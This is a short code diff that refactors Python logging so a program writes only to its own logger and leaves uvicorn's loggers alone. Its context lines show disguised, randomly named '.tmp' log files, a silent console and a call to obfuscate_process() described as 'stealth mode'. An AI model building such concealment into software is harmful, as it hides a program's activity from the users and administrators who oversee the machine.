@@ -90,15 +90,13 @@ logs_dir = Path(__file__).parent / "logs"
 logs_dir.mkdir(exist_ok=True)
 log_file = logs_dir / f"sys{random.randint(1000,9999)}.tmp"
 
-logging.basicConfig(
-    level=logging.WARNING,
-    format="%(message)s",
-    handlers=[
-        logging.FileHandler(str(log_file), mode='w', encoding='utf-8'),
-        # No StreamHandler - keeps console clean
-    ]
-)
+# Only configure our own logger - don't touch uvicorn/backend loggers
 log = logging.getLogger(__name__)
+log.setLevel(logging.WARNING)
+_fh = logging.FileHandler(str(log_file), mode='w', encoding='utf-8')
+_fh.setFormatter(logging.Formatter("%(message)s"))
+log.addHandler(_fh)
+log.propagate = False  # Don't affect root logger
 
 # Initialize stealth mode AFTER logger is setup
 obfuscate_process()
